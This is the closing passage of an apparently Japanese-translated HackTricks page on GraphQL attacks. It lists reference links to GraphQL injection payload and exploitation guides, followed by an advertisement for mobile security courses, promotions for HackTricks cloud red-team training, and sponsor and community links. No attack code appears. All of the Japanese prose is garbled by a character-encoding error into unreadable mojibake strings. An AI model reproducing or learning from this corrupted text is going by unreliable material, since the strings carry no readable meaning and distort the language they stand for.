* [**https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/GraphQL%20Injection/README.md**](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/GraphQL%20Injection/README.md)
* [**https://medium.com/@the.bilal.rizwan/graphql-common-vulnerabilities-how-to-exploit-them-464f9fdce696**](https://medium.com/@the.bilal.rizwan/graphql-common-vulnerabilities-how-to-exploit-them-464f9fdce696)
* [**https://portswigger.net/web-security/graphql**](https://portswigger.net/web-security/graphql)

<figure><img src="/.gitbook/assets/image (2).png" alt=""><figcaption></figcaption></figure>

**ãƒ¢ãƒã‚¤ãƒ«ã‚»ã‚­ãƒ¥ãƒªãƒ†ã‚£**ã®å°‚é–€çŸ¥è­˜ã‚’æ·±ã‚ã‚‹ãŸã‚ã«ã€8kSec Academy ã§å­¦ã³ã¾ã—ã‚‡ã†ã€‚è‡ªå·±ãƒšãƒ¼ã‚¹ã®ã‚³ãƒ¼ã‚¹ã‚’é€šã˜ã¦ iOS ãŠã‚ˆã³ Android ã‚»ã‚­ãƒ¥ãƒªãƒ†ã‚£ã‚’ãƒã‚¹ã‚¿ãƒ¼ã—ã€èªå®šã‚’å–å¾—ã—ã¾ã™:

{% embed url="https://academy.8ksec.io/" %}

{% hint style="success" %}
AWS ãƒãƒƒã‚­ãƒ³ã‚°ã‚’å­¦ã³ã€å®Ÿè·µã—ã¾ã—ã‚‡ã†:<img src="../../.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../.gitbook/assets/arte.png" alt="" data-size="line">\
GCP ãƒãƒƒã‚­ãƒ³ã‚°ã‚’å­¦ã³ã€å®Ÿè·µã—ã¾ã—ã‚‡ã†: <img src="../../.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricks ã‚’ã‚µãƒãƒ¼ãƒˆã™ã‚‹</summary>

* [**ã‚µãƒ–ã‚¹ã‚¯ãƒªãƒ—ã‚·ãƒ§ãƒ³ãƒ—ãƒ©ãƒ³**](https://github.com/sponsors/carlospolop)ã‚’ç¢ºèªã—ã¦ãã ã•ã„ï¼
* **ğŸ’¬ [**Discord ã‚°ãƒ«ãƒ¼ãƒ—**](https://discord.gg/hRep4RUj7f)ã¾ãŸã¯ [**Telegram ã‚°ãƒ«ãƒ¼ãƒ—**](https://t.me/peass)ã«å‚åŠ ã™ã‚‹ã‹ã€**Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**ã‚’ãƒ•ã‚©ãƒ­ãƒ¼ã—ã¦ãã ã•ã„ã€‚**
* **ãƒãƒƒã‚­ãƒ³ã‚°ã®ãƒˆãƒªãƒƒã‚¯ã‚’å…±æœ‰ã™ã‚‹ã«ã¯ã€[**HackTricks**](https://github.com/carlospolop/hacktricks)ãŠã‚ˆã³ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud)ã® GitHub ãƒªãƒã‚¸ãƒˆãƒªã« PR ã‚’æå‡ºã—ã¦ãã ã•ã„ã€‚**

</details>
{% endhint %}
